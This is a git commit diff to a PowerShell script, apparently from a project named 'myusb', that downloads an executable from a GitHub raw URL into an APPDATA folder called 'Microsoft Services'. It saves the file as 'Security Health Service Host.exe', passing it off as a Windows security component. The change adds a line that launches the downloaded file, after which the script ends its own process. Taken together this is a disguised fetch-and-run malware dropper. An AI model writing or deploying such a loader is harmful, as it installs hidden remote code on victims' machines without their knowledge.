a6f56fba110240bfdd420ecd3b00a47137d3e1b7
MitrichevGeorge <131480793+MitrichevGeorge@users.noreply.github.com>
2025-11-06 14:46:14 +0300

    Update i.ps1

--- i.ps1
+++ i.ps1
@@ -16,5 +16,6 @@ $path = "$env:APPDATA\Microsoft Services\"
 New-Item -ItemType Directory -Force -Path $path | Out-Null
 
 download "https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/main.exe" "$path\Security Health Service Host.exe"
+Start-Process "$path\Security Health Service Host.exe"
 
 Stop-Process -Id $PID
